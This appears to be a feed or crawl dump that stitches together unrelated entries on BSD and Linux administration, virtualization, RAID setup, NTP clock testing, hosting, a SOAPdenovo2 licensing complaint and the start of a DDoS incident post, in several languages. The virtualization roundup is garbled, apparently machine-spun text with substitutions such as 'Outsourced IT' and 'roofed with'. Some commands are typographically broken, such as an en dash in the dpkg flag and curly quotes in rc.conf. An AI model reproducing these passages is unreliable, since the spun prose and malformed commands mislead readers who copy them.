  <title><![CDATA[FreeBSD or BSD reboot and shutdown system]]></title>
  <summary><![CDATA[Q. How do I reboot or shutdown BSD (FreeBSD) based system. Command shutdown -h 0 is not working for  me. 
A. FreeBSD or other BSD uses the shutdown or halt command  to shutdown system. To reboot  FreeBSD/BSD box use reboot command. 
Task: Shutdown BSD 
Use shutdown command  to close down the system at a given time. Type following command  to shutdown  system immediately: #  shutdown  -h  now OR 
#  halt 
Task: Reboot BSD system 
Type the following command: 
#  reboot OR #  shutdown  -r now 
Show all installed packages or software in Linux, FreeBSD, OpenBSD 
Q. I am using CentOS how do I show all installed packages in Linux? 
A. You need to use rpm command  to display all installed packages in Linux. 
Red Hat/Fedora Core/CentOS Linux 
Type the following command  to get list of all installed software 
#  rpm  -qa  | less 
Debian Linux 
Type the following command  to get list of all installed software: 
#  dpkg   –get-selections 
Ubuntu  Linux 
Type the following command  to get list of all installed software: 
#  sudo  dpkg   –get-selections 
FreeBSD Type the following command  to get list of all installed software: #  pkg_info  | less #  pkg_info  apache 
Use pkg_version command  to summarizes the versions of all installed packages: 
#  pkg_version  | less #  pkg_version  | grep ‘lsof’ 
OpenBSD OpenBSD also use pkg_info command  to display list of all installed packages or software: #  pkg_info  | less #  pkg_info  apache 
chkconfig on FreeBSD to start services automatically initial boot time 
Q. How do I use chkconfig on FreeBSD to start services automatically? A. You cannot use chkconfig on FreeBSD. It is RedHat/CentOS/Fedora Core only command. FreeBSD  provides another facility called rc.conf. This file contains which services should be started up at  system initial boot time. You can edit this file by hand using text editor or use sysinstall text  based GUI tool to update this file. 
Task: Start services automatically initial boot time 
For example to start OpenSSH / SSHD services automatically initial boot time: #  vi  /etc/rc.conf 
Append following line: 
sshd_enable=”YES” 
Save and close the file. 
Task: Start services automatically initial boot time using sysinstall Type the following command: #  sysinstall]]></summary>

  <title><![CDATA[Linux Virtualization Computer software]]></title>
  <summary><![CDATA[Outsourced IT is one of the most readily useful systems in the planet of research, and may be needed not merely in Enterprise level, but additionally in Desktops. Here we present you the best remedies in Linux Outsourced IT software.Review of Linux Virtualization SoftwareA VMware Player - Aside from dominating the Windows Desktop market, VMware reigns on Linux devices too - and just like in Windows, it helps most of the different kinds of Guest OS, including Linux tastes such as Debian and Ubuntu, as well as different versions of Microsoft Windows such as Windows XP and Windows 7. Yet another benefit of VMware is that VMware has consumers for Windows and Mac OS too, meaning that you may manage your virtual machines on all of these different running systems.A QEMU is an emulator as opposed to a pure Virtualization software, but since it's so rapid and helpful, it's worth a mention here. It's a cross platform power, and enables you to have guest OS of many different types including Microsoft Windows and flavors of Linux.A Xen by Xensource is just a virtualization answer for 32 / 64 bit Intel / AMD (IA 64) and PowerPC 970 architectures. It allows many different guest systems to be accomplished on the same computing devices at the same time, simultaneously. XEN comes bundled with most widely used Linux distributions such as for instance Ubuntu, Debian, Fedora, CentOS, RHEL and several others.A VirtualBox is an x86 virtualization program, manufactured by Sun Microsystems as part of its Sun xVM virtualization system. Supported host operating systems include Linux, Mac OS X, OS/2 Warp, Windows XP or Vista, and Solaris, while recognized guest operating systems include FreeBSD, Linux, OpenBSD, OS/2 Warp, Windows and Solaris.A Bochs is a lightweight x86 and x86-64 emulator and debugger. Many guest os's may be run utilising the emulator including Microsoft Windows, MS DOS, BSDs, Linux, AmigaOS, Rhapsody and MorphOS. Bochs may work on many host systems, like Linux, Windows, Windows Mobile and Mac OS XA Kernel-based Virtual Machine (KVM) is based on Linux kernel virtualization structure. Native virtualization is currently supported by kvm applying AMD-V or Intel VT. An extensive selection of guest systems use KVM, including several flavors of BSD, Solaris, Linux, and Windows etc. KVM is roofed with OpenSuse, Debian and other Linux distributions.Whether you want to run applications in an online sandbox, or want to develop software for a different platform, software virtualization may save yourself you a lot of trouble with different systems. If you see yourself starting a lot of different Systems during the course of a day, try virtualization on Linux.]]></summary>

  <title><![CDATA[Mobile & Technology eDiscovery: Directory of Data Recovery Soft ...]]></title>
  <summary><![CDATA[Directory of Data Recovery Soft ToolsPractitioners of eDiscovery or data recovery approach the matter from many angles. Primarily, any ESI (electronically stored information) data requires understanding and analysis of devices and systems which may contain/store the ESI. Take the eDiscovery issue. There are the argumentative issues of what is viewable and what is not: ?? "If there is a large volume of ESI, you should  discuss the best method for it to be searched, collected, filtered and  reviewed with your lawyer." www.out-law.com/en/top...privilege/  However, there is a myraid of issues involved prior to even enabling ESI to become visible and legible. Indeed, tools that can be used for common and standard office based systems can have limited or absolutely no effect for industrial based devices and systems. Today's savvy investigator is not only expected to technology aware but also technology astute where ESI is concerned: "A typical smart phone contains a 2 GB removable  memory card, which can contain the equivalent of 40 banker?s boxes of  paper, or 100,000 pages." A Litigation Neccesity: Electronically Stored Information (ESI) Review Tools?  This is not an exhaustive directory listing below and even then I shall need to add another 400 entries or more as there are so many varieties out there.

  <summary><![CDATA[1. Create the disk partition for your mirror device  fdisk /dev/sdb  ==> /dev/sdb1 fdisk /dev/sdc  ==> /dev/sdc1 Note: Make sure you mdadm (multiple device program) package is installed.  2. scan the partition table, # partprobe /dev/sdb # partprobe /dev/sdc or # echo 1 > /sys/block/sdb/device/rescan  3. Create your mddevice. # mdadm -C /dev/md0 -l 1 -n 2 /dev/sdb1 /dev/sdc1 or # mdadm --create /dev/md0 --level=1 --raid-devices=2 /dev/sdb1 /dev/sdc1 Options: -C -> --create ; -l-> --level= ; -n -> --raid-devices; -Q, --query ; -D -> --detail  4. Check the sync status between the array. # watch cat /proc/mdstat  5. Create a filesystem # mkfs.ext4 /dev/md0  6. Mount the miror device # mkdir /opt/myRAID1; mount /dev/md0 /opt/myRAID1 # df -h /opt/myRAID1  7. Add entry to the fstab to make it persistent across the reboot. # echo '/dev/md0 /opt/myRAID1 ext4 defaults 0 0' >> /etc/fstab  8. Get the detail info about the mddevice. # mdadm -Q -D /dev/md0  ================= Detail =======================  Make sure you mdadm (multiple device program) package is installed.  1.

  <title><![CDATA[29c3: vision making thumb drives intelligent]]></title>
  <summary><![CDATA[Some talks at hacker conferences tend to disappoint the audience while others turn out to be a very pleasant surprise. Last thing happened to me during the 29c3 conference.  Just one word ti describing the talk: mind-blowing.  Name of the talk: "Writing a Thumbdrive from Scratch - Prototyping Active Disk Antiforensics"Speaker: Travis Goodspeed What is it about:Travis talked about re-thinking about thumb drives such as USB sticks. Instead of seeing it as a dumb block device, such drives have pretty remarkable similarities to real computers. It reminded me on my previous thoughts about several features both of serial ata and solid state disk drives, as the disk controller operates both in a very intransparent point of view and has a remarkable layer of intelligent storage management. But Travis went quite a lot further than what my previous considerations were about - basically I just found it interesting that serial ATA devices for example do a native command queuing which means the drive decides in which specific order the requested blocks are read so that the device can heads minimize back-and-forth movement of the reading head. Travis thought, that emulating the behaviour of a simple USB stick has got unlimited potential for anti-forensic tricks. For example, putting some intelligence into an USB stick would make it able to distinguish wether the owner's OpenBSD (as an example) accesses it or some Microsoft operating system - or maybe the disk recognizes that it's oviously being dumped because the operating systems requests the disk to read all sectors starting at sector 1 and reading all following sectors in subsequential order. Think about it for a minute, what an intelligent disk could be able to do/emulate when it detects that it is being read in a different environment than in hacker's very own notebook.  tl;drTravis Goodspeed showed a way for a USB stick to be quite an intelligent device able to dynamically change behaviour like a chameleon.I highly recommend the lecture of his talk. It blew my mind and shook hard my point of view about disks possibly being intelligent devices.

Aunque pienses que el sistema operativo que tienes en tu equipo es el único que puede haber en tu ordenador, existen aplicaciones como ésta que te permiten crear un entorno adecuado y específico, dentro de tu disco duro, para poder instalar otro. 
 
¿Es posible tener dos sistemas operativos en un mismo ordenador sin que haya inevitables conflictos entre ambos? Sí, ya que podemos instalar un segundo sistema operativo si lo hacemos de manera virtual, de manera que no afectará al funcionamiento del sistema principal ni al suyo propio. 
 
VirtualBox es, precisamente, una aplicación que configura ese segundo sistema operativo dentro de tu equipo. Genera un marco de trabajo ad hoc y ahí lo coloca. VirtualBox es compatible para Windows (no incluye Windows 7), Linux y OpenBSD. 
 
Utilizar esta aplicación es bastante sencillo. Descarga la VirtualBox correspondiente al sistema operativo que vayas a cargar en tu equipo y ya puedes ejecutarlo. Para pasar a tu sistema operativo principal, sólo tienes que pulsar la tecla Control de la parte derecha del teclado de tu ordenador. 
 
Al parecer esta version de VirtualBox es incompatible con Windows 7 en su version de 64 bits con el service pack instalado.

  <title><![CDATA[Dedicated Servers hosting]]></title>
  <summary><![CDATA[Dedicated Servers hosting A dedicated hosting service, dedicated server, or managed hosting service is a type of Internet hosting in which the client leases an entire server not shared with anyone else. This is more flexible than shared hosting, as organizations have full control over the server(s), including choice of operating system, hardware, etc. Server administration can usually be provided by the hosting company as an add-on service. In some cases a dedicated server can offer less overhead and a larger return on investment. Dedicated servers are most often housed in data centers, similar to colocation facilities, providing redundant power sources and HVAC systems. In contrast to colocation, the server hardware is owned by the provider and in some cases they will provide support for your operating system or applications. Using a dedicated hosting service offers the benefits of high performance, security, email stability, and control.Due to the relatively high price of dedicated hosting, it is mostly used by websites that receive a large volume of traffic.  Operating system supportAvailability, price and employee familiarity often determines which operating systems are offered on dedicated servers. Variations of Linux and Unix (open source operating systems) are often included at no charge to the customer. Commercial operating systems include Microsoft Windows Server, provided through a special program called Microsoft SPLA. Red Hat Enterprise is a commercial version of Linux offered to hosting providers on a monthly fee basis. The monthly fee provides OS updates through the Red Hat Network using an application called yum. Other operating systems are available from the open source community at no charge. These include CentOS, Fedora Core, Debian, and many other Linux distributions or BSD systems FreeBSD, NetBSD, OpenBSD. Support for any of these operating systems typically depends on the level of management offered with a particular dedicated server plan. Operating system support may include updates to the core system in order to acquire the latest security fixes, patches, and system-wide vulnerability resolutions. Updates to core operating systems include kernel upgrades, service packs, application updates, and security patches that keep server secure and safe. Operating system updates and support relieves the burden of server management from the dedicated server owner. Bandwidth and connectivityBandwidth refers to the data transfer rate or the amount of data that can be carried from one point to another in a given time period (usually a second) and is often represented in bits (of data) per second (bit/s). For example, visitors to your server, web site, or applications utilize bandwidth *Third – Total Transfer (measured in bytes transferred) 95th percentile method: line speed, billed on the 95th percentile, refers to the speed in which data flows from the server or device, measured every 5 minutes for the month, and dropping the top 5% of measurements that are highest, and basing the usage for the month on the next-highest measurement. This is similar to a median measurement, which can be thought of as a 50th percentile measurement (with 50% of measurements above, and 50% of measurements below), whereas this sets the cutoff at 95th percentile, with 5% of measurements above the value, and 95% of measurements below the value. This is also known as Burstable billing Line speed is measured in bits per second (or kilobits per second, megabits per second or gigabits per second). Unmetered method: The second bandwidth measurement is unmetered service where providers cap or control the “top line” speed for a server. Top line speed in unmetered bandwidth is the total Mbit/s allocated to the server and configured on the switch level. For example, if you purchase 10 Mbit/s unmetered bandwidth, the top line speed would be 10 Mbit/s. 10 Mbit/s would result in the provider controlling the speed transfers take place while providing the ability for the dedicated server owner to not be charged with bandwidth overages. Unmetered bandwidth services usually incur an additional charge. Total transfer method: Some providers will calculate the Total Transfer, which is the measurement of actual data leaving and arriving, measured in bytes. Although it is typically the sum of all traffic into and out of the server, some providers measure only outbound traffic (traffic from the server to the internet). Bandwidth pooling: This is a key mechanism for hosting buyers to determine which provider is offering the right pricing mechanism of bandwidth pricing.[according to whom?] Most Dedicated Hosting providers bundle bandwidth pricing along with the monthly charge for the dedicated server. Let us illustrate this with the help of an example. An average $100 server from any of the common dedicated bandwidth providers would carry 2 TB of bandwidth. Suppose you purchased 10 servers then you would have the ability to consume 2 TB of bandwidth per server. However, let us assume that given your application architecture only 2 of these 10 servers are really web facing while the rest are used for storage, search, database or other internal functions then the provider that allows bandwidth pooling would let you consume overall 20 TB of bandwidth as incoming or outbound or both depending on their policy. The provider that does not offer bandwidth pooling would just let you use 4 TB of bandwidth, and the rest of the 16 TB of bandwidth would be practically unusable. This fact is commonly known by all hosting providers, and allows hosting providers to cut costs by offering an amount of bandwidth that frequently will not be used. This is known as overselling, and allows high bandwidth customers to use more than what a host might otherwise offer, because they know that this will be balanced out by those customers who use less than the maximum allowed. One of the reasons for choosing to outsource dedicated servers is the availability of high powered networks from multiple providers. As dedicated server providers utilize massive amounts of bandwidth, they are able to secure lower volume based pricing to include a multi-provider blend of bandwidth. To achieve the same type of network without a multi-provider blend of bandwidth, a large investment in core routers, long term contracts, and expensive monthly bills would need to be in place. The expenses needed to develop a network without a multi-provider blend of bandwidth does not make sense economically for hosting providers. Many dedicated server providers include a service level agreement based on network uptime. Some dedicated server hosting providers offer a 100% uptime guarantee on their network. By securing multiple vendors for connectivity and using redundant hardware, providers are able to guarantee higher uptimes; usually between 99-100% uptime if they are a higher quality provider. One aspect of higher quality providers is they are most likely to be multi-homed across multiple quality uplink providers, which in turn, provides significant redundancy in the event one goes down in addition to potentially improved routes to destinations. Bandwidth consumption over the last several years has shifted from a per megabit usage model to a per gigabyte usage model. Bandwidth was traditionally measured in line speed access that included the ability to purchase needed megabits at a given monthly cost. As the shared hosting model developed, the trend towards gigabyte or total bytes transferred, replaced the megabit line speed model so dedicated server providers started offering per gigabyte. Prominent players in the dedicated server market offer large amounts of bandwidth ranging from 500 gigabytes to 3000 gigabytes using the “overselling” model. It is not uncommon for major players to provide dedicated servers with 1Terabyte (TB) of bandwidth or higher. Usage models based on the byte level measurement usually include a given amount of bandwidth with each server and a price per gigabyte after a certain threshold has been reached. Expect to pay additional fees for bandwidth overage usage. For example, if a dedicated server has been given 3000 gigabytes of bandwidth per month and the customer uses 5000 gigabytes of bandwidth within the billing period, the additional 2000 gigabytes of bandwidth will be invoiced as bandwidth overage. Each provider has a different model for billing. As of yet, no industry standards have been set. ManagementDedicated hosting services primarily differ from managed hosting services in that managed hosting services usually offer more support and other services. As such, managed hosting is targeted towards clients with less technical knowledge, whereas dedicated hosting services, or unmanaged hosting services, are suitable for web development and system administrator professionals.[3] To date, no industry standards have been set to clearly define the management role of dedicated server providers. What this means is that each provider will use industry standard terms, but each provider will define them differently. For some dedicated server providers, fully managed is defined as having a web based control panel while other providers define it as having dedicated system engineers readily available to handle all server and network related functions of the dedicated server provider. Server management can include some or all of the following: Operating system updatesApplication updatesServer monitoringSNMP hardware monitoringApplication monitoringApplication managementTechnical supportFirewall servicesAnti-spam softwareAntivirus updatesSecurity auditsDDoS protection and mitigationIntrusion detectionBackups and restorationDisaster recoveryDNS hosting serviceLoad balancingDatabase administrationPerformance tuningSoftware installation and configurationUser managementProgramming consultationDedicated hosting server providers define their level of management based on the services they provide. In comparison, fully managed could equal self managed from provider to provider. Administrative maintenance of the operating system, often including upgrades, security patches, and sometimes even daemon updates are included. Differing levels of management may include adding users, domains, daemon configuration, or even custom programming. Dedicated server hosting providers may provide the following types of server managed support: Fully managed – Includes monitoring, software updates, reboots, security patches and operating system upgrades. Customers are completely hands-off.Managed – Includes medium level of management, monitoring, updates, and a limited amount of support. Customers may perform specific tasks.Self-managed – Includes regular monitoring and some maintenance. Customers provide most operations and tasks on dedicated server.Unmanaged – Little to no involvement from service provider. Customers provide all maintenance, upgrades, patches, and security SecurityDedicated hosting server providers utilize extreme security measures to ensure the safety of data stored on their network of servers. Providers will often deploy various software programs for scanning systems and networks for obtrusive invaders, spammers, hackers, and other harmful problems such as Trojans, worms, and crashers (Sending multiple connections). Linux and Windows use different software for security protection. SoftwareProviders often bill for dedicated servers on a fixed monthly price to include specific software packages. Over the years, software vendors realized the significant market opportunity to bundle their software with dedicated servers. They have since started introducing pricing models that allow dedicated hosting providers the ability to purchase and resell software based on reduced monthly fees. Microsoft offers software licenses through a program called the Service Provider License Agreement. The SPLA model provides use of Microsoft products through a monthly user or processor based fee. SPLA software includes the Windows Operating System, Microsoft SQL Server, Microsoft Exchange Server, Microsoft SharePoint and shoutcast hosting, and many other server based products. Dedicated server providers usually offer the ability to select the software you want installed on a dedicated server. Depending on the overall usage of the server, this will include your choice of operating system, database, and specific applications. Servers can be customized and tailored specific to the customer’s needs and requirements. Other software applications available are specialized web hosting specific programs called control panels. Control panel software is an all inclusive set of software applications, server applications, and automation tools that can be installed on a dedicated server. Control panels include integration into web servers, database applications, programming languages, application deployment, server administration tasks, and include the ability to automate tasks via a web based front end. Most dedicated servers are packaged with a control panel. Control panels are often confused with management tools, but these control panels are actually web based automation tools created to help automate the process of web site creation and server management. Control panels should not be confused with a full server management solution by a dedicated hosting provider. LimitationsMany providers do not allow IRC (bots, clients or daemons). This is due to rogue IRC users triggering DDoS attacks against the provider, which may overwhelm their networks, lowering service quality for all customers.[4][citation needed] Adult content is disallowed by many providers as it may either be of questionable legality or consume large amounts of bandwidth.Copyright violations – Hosting copyrighted material of which an individual does not own the copyright to is against the terms of service of most hosting companies.]]></summary>

  <title><![CDATA[NTP szinkron ellenőrzése]]></title>
  <summary><![CDATA[Kétségbeejtően sokat foglalkozom Linuxszal mostanában, szerencsére itt is utolér néha egy-egy érdekesebb hálózati feladat. Nemrég például arra kellett választ adnom, hogy mekkora differenciával jár tetszőleges két Linux szerver órája egymáshoz képest egy adott LAN egy adott subnetjében. Természetesen van kiépített belső NTP infrastruktúra, szóval akár csípőből megválaszolható egy ilyen kérdés azzal, hogy általában LAN esetén egy-két ms körül lehet ez az érték, annál nem valószínű, hogy több lenne az eltérés bármelyik két hoszt között, ha jól működik az NTP. Ez persze egyrészt nem pontos válasz, másrészt ha nem elég meggyőző az ember, és nincs ott a prompt válasz előkészítve, amikor mondjuk egy konferenciahívás alatt felmerül a kérdés, könnyen olyan helyzetben találhatja magát, hogy már meg is kapta az egészet feladatként.  Ebben az esetben egyébként a fókusz tehát nem is azon volt, hogy mennyire pontosak az órák vmilyen abszolútnak tekinthető stratum 1-es forráshoz képest, hanem hogy az adott subnet linuxos szerverein egymáshoz képest mennyire megbízhatók a logokban és adatbázisokban található timestampek, amely feladat első lépése annak a kiderítése, hogy mennyire pontosak a rendszerórák egymáshoz képest. Az NTP implementációval érkező diagnosztikai eszközök, pl. az ntpq ezeket az adatokat csak NTP szerver - NTP kliens viszonylatban tudja megmondani, nekünk általánosabb megoldásra volt szükségünk.  Egy rövid kis megbeszélés után arra jutottunk az egyik kollégával, hogy a legegyszerűbb talán az lenne, ha valamilyen multicast programmal szórnánk az aktuális timestampet valamelyik hostról (a timestamp lenne a tartalma a multicast a UDP csomagoknak), a többi szerveren meg sniffelnénk a hálózati forgalmat ngreppel, a multicast csomagok beérkezésének timestampjét pedig a csomagban lévő timestamppel összehasonlítanánk. Utána már csak a szerepeket kell forgatni a hostok közt, ha egy teljes mátrixot szeretnénk feltölteni az eredményekkel. Persze az eredmények nem lesznek teljesen pontosak, hiszen nem az órák közti differenciát fogják mutatni, benne lesz a timestamp feldolgozási ideje, UDP + IP + Ethernet csomagolása, az Ethernet késleltetése, stb. de azért adhat egy jó közelítést az órák pontosságáról. Ha például azt találjuk majd, hogy átlagosan +10 ms körüli az eltérés az átküldött timestamp és annak sniffelési ideje között, akkor az nem lesz túl rózsás eredmény, míg mondjuk ha csak 1 ms az átlagos eltérés az imént felsorolt feldolgozási idők hozzáadódása ellenére is, akkor nyugodtan hátradőlhetünk, minden rendben (üzleti oldalról az 1 ms-os pontosság az elvárás). El is kezdtem ilyesmire alkalmas programokat keresgélni, aztán persze addig faragtam a paramétereken, míg kiderült, hogy semmilyen extra programra nincs szükség, az egész tesztet meg lehet oldani az alap Ubuntu telepítéssel érkező programokkal.  A teszthez használt "szerver", ami az aktuális időbélyeget kiteszi hálózatra, nem kell hogy bonyolultabb legyen, mint egy date és netcat parancs, multicastra sincs szükség, hiszen subneten belül ugyanúgy megteszi a broadcast is:  date +%Y/%m/%d\ %k\:%M\:%S.%N | nc -b -u 192.168.0.255 6666  A parancs az ngrep kimenetének megfelelően formázott timestamp stringet fog elküldeni a megadott broadcast cím megadott portjára. Ubuntu 10.04-ben ez működik is, a 12.04-esben viszont lecserélték a netcat csomagot az OpenBSD netcatjére, ami sajnos nem tud broadcastolni, így Precise alatt a "netcat-traditional" csomagot is telepítenünk kell. A "kliens" oldal, ami a subnet összes gépén akár párhuzamosan is futhat, az ngrep megfelelően paraméterezve:  root@betazed:~# ngrep -q -t -d eth0 port 6666 interface: eth0 (192.168.0.0/255.255.255.0) filter: (ip or ip6) and ( port 6666 )  U 2012/12/27 23:17:54.698920 192.168.0.4:60071 -> 192.168.0.255:6666   2012/12/27 23:17:54.698705783.  U 2012/12/27 23:18:09.858924 192.168.0.4:36778 -> 192.168.0.255:6666   2012/12/27 23:18:09.858708142.  U 2012/12/27 23:18:13.428859 192.168.0.4:38310 -> 192.168.0.255:6666   2012/12/27 23:18:13.428650913.   Az adatok értelmezésére érdemes némi időt fordítani, az ngrep timestamp mikroszekundumban értendő, a közvetlenül alatta lévő sor pedig az UDP payload, ahol a date parancs által a másik hoszton előállított timestamp szerepel nanoszekundumos pontossággal. Itt például látszik, hogy az időbélyeg teljes feldolgozása, hálózaton átküldése és kliens oldali feldolgozása átlagban 213 mikroszekundum volt három különböző "szerver" futtatás alkalmával. Pontosan ugyanezek a a "szerver" lefutások természetesen más eredményt adnak egy másik hosztról nézve:  root@trill:~# ngrep -q -t -d eth0 port 6666 interface: eth0 (192.168.0.0/255.255.255.0) filter: (ip or ip6) and ( port 6666 )  U 2012/12/27 23:17:54.699099 192.168.0.4:60071 -> 192.168.0.255:6666   2012/12/27 23:17:54.698705783.  U 2012/12/27 23:18:09.859099 192.168.0.4:36778 -> 192.168.0.255:6666   2012/12/27 23:18:09.858708142.  U 2012/12/27 23:18:13.429031 192.168.0.4:38310 -> 192.168.0.255:6666   2012/12/27 23:18:13.428650913.    Itt 388 mikroszekundum az átlagos eltérés a "szerver" által küldött időpont és az UDP szegmens "kliensre" beérkezésének időpontja között. Megint más lesz az eredmény egy harmadik "kliensről" vizsgálódva, ami sok tényezőtől függhet, például attól is, hogy hány switchen keresztül vezet az UDP broadcast útja, hiszen minden egyes switch hozzáadja a maga késleltetését. Rosszul járó órára akkor gyanakodhatunk, ha valamelyik hostról a küldött  és fogadott adatok eredményei szignifikánsan eltérnek a többieken  mértektől. A konklúzió nálunk az volt, hogy az órák egymáshoz képest meglepően pontosan járnak abban a subnetben, ahol a vizsgálatot végeztem, és a Wikipédián említett 1ms-os LAN-on elérhető NTP pontosságot messze túlteljesítjük.]]></summary>

  <summary><![CDATA[¿Quieres probar un programa pero no te atreves por si dañas tu sistema operativo? ¿Te gustaría tener otro sistema operativo pero sin quitar el tuyo? ¿Imaginas probar Windows Vista desde tu XP? Todo esto es posible con VirtualBox, una utilidad gratuita que crea un ordenador virtual dentro del tuyo, con su sistema operativo totalmente independiente. De esta forma, podrás crear ‘máquinas virtuales’ con diferentes sistemas operativos y así tener a tu disposición un Windows 95, un Vista, un 2000 un XP o incluso un Linux. Todo desde tu sistema operativo actual. Para utilizarlo, primero deberás conseguir o crear tu mismo una máquina virtual del sistema operativo que desees, después, cargarla con el programa y listo, arrancará como si de un nuevo sistema operativo se tratase. Por cierto, el programa no ocupa demasiado, pero ten presente que las máquinas virtuales suelen ocupar bastante espacio, fácilmente de cuatro a seis gigabytes.  Sistemas operativos virtuales      Windows (98, NT 4.0, 2000, XP, Server 2003, Vista, Server 2008), DOS/Windows 3.x     Linux (Kernel 2.4 y 2.6), FreeBSD/OpenBSD, Solaris 10, OS/2, etc.  Features      Modularity     Virtual machine descriptions in XML     Guest Additions for Windows and Linux     Shared folders     Virtual USB Controllers     Remote Desktop Protocol     USB over RDP

  <title><![CDATA[The source code of SOAPdenovo2 sits in the shadows]]></title>
  <summary><![CDATA[Update 2012-12-28: SOAPdenovo 2.04-r223 source code was posted online on 2012-12-28. Some minor concerns:  1. The tarball suffers from the bundled library problem (libbam.a and libbammac.a are shipped precompiled). This is incompatible with the GPLv3 license.  2. The Makefile is not portable with its hard-coded paths to compilers (/opt/blc/gcc-4.5.0/bin/gcc should just be gcc).   The SOAPdenovo2 article was published today under the terms of the Creative Commons Attribution License. Here are the Availability and requirements for SOAPdenovo2 as reported in the article:  Availability and requirements  Project name: SOAPdenovo2 Project home page: http://soapdenovo2.sourceforge.net/ Operating system(s): e.g. Platform independent Programming language: C, C++ Other requirements: GCC version ≥ 4.5.0 License: GNU General Public License version 3.0 (GPLv3) Any restrictions to use by non-academics: none Contact: bgi-soap@googlegroups.com     I fired up my browser and in a flash went to the "Project home page". I downloaded the latest SOAPdenovo2 distribution but was disappointed to see that the SOAPdenovo2 distribution was binary-only. This is a logical contradiction with the GNU General Public License, version 3 -- the license under which SOAPdenovo2 is being distributed according to the article above.  Binary-only distribution is the path to the dark side (proprietary) The SOAPdenovo2 distribution contains 4 pre-compiled binaries and 2 plain-text files. No source files were found, which is confusing because the GNU General Public License, version 3, is for distributing open source software with an emphasis for freedom.  Table 1: Files distributed in the tarball called SOAPdenovo2_revision217.tgz  <!--   @page { margin: 0.79in }   TD P { margin-bottom: 0in }   P { margin-bottom: 0.08in }   -->         File  Type   MANUAL  ASCII text, with very long lines    update.log  ASCII text    pregraph_sparse_127mer.v1.0.3  ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically    linked, for GNU/Linux 2.6.9, not stripped   pregraph_sparse_63mer.v1.0.3  ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically    linked, for GNU/Linux 2.6.9, not stripped   SOAPdenovo-127mer  ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically    linked, for GNU/Linux 2.6.9, not stripped   SOAPdenovo-63mer  ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically    linked, for GNU/Linux 2.6.9, not stripped  Concerns of a bioinformatics adventurerConcern #1: ELF 64-bit LSB executables for GNU/Linux 2.6.9 are not platform-independent. Therefore, the claim of platform independence is false. For instance, I can not run these executables on OpenBSD.  Concern #2: GCC version ≥ 4.5.0 is not required as it is a proprietary binary distribution. Therefore this requirement is untrue.  Concern #3: proprietary software distributions are not eligible to licensing under the GNU General Public License version 3. Therefore, the authors should select their own proprietary license or release the source code of SOAPdenovo2. The previous last publicly available version was SOAPdenovo v1.05.   What the reviewers had to say ? Reviewer #AJN was concerned here and here by the lack of source code.  Freedoms provided by free softwareAccording to the Free Software Foundation, Inc.:  A program is free software if the program's users have the four essential freedoms:  The freedom to run the program, for any purpose (freedom 0).The freedom to study how the program works, and change it so it       does your computing as you wish (freedom 1). Access to the source       code is a precondition for this.   The freedom to redistribute copies so you can help your neighbor       (freedom 2).   The freedom to distribute copies of your modified versions       to others (freedom 3).  By doing this you can give the whole       community a chance to benefit from your changes.       Access to the source code is a precondition for this.  $]]></summary>

  <summary><![CDATA[1.    Que es mantenimiento preventivoEn las operaciones de mantenimiento, el mantenimiento preventivo es el destinado a la conservación de equipos o instalaciones mediante realización de revisión y reparación que garanticen su buen funcionamiento y fiabilidad. El mantenimiento preventivo se realiza en equipos en condiciones de funcionamiento, por oposición al mantenimiento correctivo que repara o pone en condiciones de funcionamiento aquellos que dejaron de funcionar o están dañados.El primer objetivo del mantenimiento es evitar o mitigar las consecuencias de los fallos del equipo, logrando prevenir las incidencias antes de que estas ocurran. Las tareas de mantenimiento preventivo incluyen acciones como cambio de piezas desgastadas, cambios de aceites y lubricantes, etc. El mantenimiento preventivo debe evitar los fallos en el equipo antes de que estos ocurran.Algunos de los métodos más habituales para determinar que procesos de mantenimiento preventivo deben llevarse a cabo son las recomendaciones de los fabricantes, la legislación vigente, las recomendaciones de expertos y las acciones llevadas a cabo sobre activos similares                                                  http://www.youtube.com/watch?v=6aGYFzcBg3o            http://es.wikipedia.org/wiki/Mantenimiento_preventivo                                           M. Correctivo.Dentro de las operaciones de mantenimiento, se denomina mantenimiento correctivo, a aquel que corrige los defectos observados en los equipamientos o instalaciones, es la forma más básica de mantenimiento y consiste en localizar averías o defectos y corregirlos o repararlos.Históricamente es el primer concepto de mantenimiento que se planteo, y el único hasta la primera guerra mundial, dada la simplicidad de las maquinas, equipamientos e instalaciones de la época, mantenimiento era sinónimo de reparar aquello que estaba averiado. Posteriormente se planteo que el mantenimiento no solo tenia que corregir las averías, sino que tenia que adelantarse a ellas garantizando el correcto funcionamiento de las maquinas, evitando el retraso producido por las averías y sus consecuencia, dando lugar a lo que se denomino: mantenimiento preventivo que es el que se hace, preventivamente en equipo en funcionamiento, en evicción de posteriores averías, garantizando un periodo de uso fiable.                          http://es.wikipedia.org/wiki/Mantenimiento_correctivo2.    Qué son las máquinas virtuales.En informática una máquina virtual es un software que simula a una computadora y puede ejecutar programas como si fuese una computadora real. Este software en un principio fue definido como "un duplicado eficiente y aislado de una máquina física". La acepción del término actualmente incluye a máquinas virtuales que no tienen ninguna equivalencia directa con ningún hardware real. Una característica esencial de las máquinas virtuales es que los procesos que ejecutan están limitados por los recursos y abstracciones proporcionados por ellas. Estos procesos no pueden escaparse de esta "computadora virtual". Uno de los usos domésticos más extendidos de las máquinas virtuales es ejecutar sistemas operativos para "probarlos".

  <title><![CDATA[DDOS Bots Are People! (Or Manned By Some, At Least)]]></title>
  <summary><![CDATA[Mitigating a DDOS attack against your infrastructure involves both people skills and tech skills. Whining won't cut it at all. The underlying problem remains the sad fact that the botnet herders are able to find fresh hosts for their malware. Should we start publishing more information about those pesky DDOS participants?  I have a confession to make. For a while and up until recently, one of my name servers was in fact an open resolver. The way I discovered and fixed the problem was by way of a rather crude DNS based DDOS.   Regular readers (Hi, Bert!) will be aware that I haven't actually published anything noteworthy for a while.  So I was a bit surprised to find in early December 2012 that bsdly.net and associated domains was under a DNS based distributed denial of service (DDOS) attack.  The attack itself appeared to be nothing special -- just a bunch of machines sending loads and loads of rubbish DNS requests directed at the IP addresses listed as authoritative masters for a few selected domains.  The targets were on relatively modest connections (think SOHO grade), so their pipes were flooded by the traffic and the people who were relying on that connectivity were not getting much network-related done. The sites weren't totally offline, but just about anything would time out without completing and life would be miserable. I've made a graph of the traffic available here, in a weekly view of that approximate period that nicely illustrates normal vs abnormal levels for those networks, generated by nfsen from pflow(4) data.   The networks under attack were in this instance either part of my personal lab or 